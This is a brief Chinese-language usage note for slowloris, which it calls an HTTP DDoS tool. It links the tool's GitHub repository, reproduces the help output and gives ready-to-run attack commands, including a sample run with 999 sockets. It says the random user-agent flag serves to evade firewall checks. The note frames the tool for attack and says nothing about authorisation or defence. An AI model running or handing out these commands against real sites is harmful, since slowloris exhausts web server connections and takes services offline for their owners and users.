http DDOS工具：
slowloris

copy from GitHub:
https://github.com/gkbrk/slowloris

用法很简单，下载slowloris.py文件
python3 slowloris.py example.com就可以了

查看有哪些命令参数：
$ python3 slowloris.py --help
        usage: slowloris.py [-h] [-p PORT] [-s SOCKETS] [-v] [-ua] [-x]
                            [--proxy-host PROXY_HOST] [--proxy-port PROXY_PORT]
                            [--https]
                            [host]

        Slowloris, low bandwidth stress test tool for websites

        positional arguments:
          host                  Host to perform stress test on

        optional arguments:
          -h, --help            show this help message and exit
          -p PORT, --port PORT  Port of webserver, usually 80
          -s SOCKETS, --sockets SOCKETS
                                Number of sockets to use in the test
          -v, --verbose         Increases logging
          -ua, --randuseragents
                                Randomizes user-agents with each request
          -x, --useproxy        Use a SOCKS5 proxy for connecting
          --proxy-host PROXY_HOST
                                SOCKS5 proxy host
          --proxy-port PROXY_PORT
                                SOCKS5 proxy port
          --https               Use HTTPS for the requests
          
   其中，-s 是指定建立连接的数目，默认是150，可以指定更大的数值
        -ua 用于躲避防火墙的检查
        
      如：slowloris.py -p 80 -s 999 -ua IP或域名  
        
